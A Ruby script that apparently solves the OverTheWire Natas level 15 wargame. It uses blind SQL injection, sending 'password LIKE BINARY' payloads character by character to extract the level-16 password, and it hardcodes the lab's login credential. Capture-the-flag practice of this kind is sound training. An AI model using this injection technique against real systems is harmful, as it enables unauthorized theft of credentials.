require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pass = ""
32.times do |i|
  allChars.split("").each do |c|
    uri = URI.parse("http://natas15.natas.labs.overthewire.org/index.php")
    params = {'username' => "natas16\" AND password LIKE BINARY \"#{pass + c}%\"-- "}
    http = Net::HTTP.new(uri.host,uri.port)
    req = Net::HTTP::Get.new(uri.path)
    req.basic_auth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
    req.set_form_data(params)

    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
    req.basic_auth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

    resp = http.request(req)
    if resp.body.include?("This user exists")
      pass += c
      puts "(#{pass.length}/32) => #{pass}"
      break
    end
  end
end
  

puts "Password for Level 16: #{pass}"
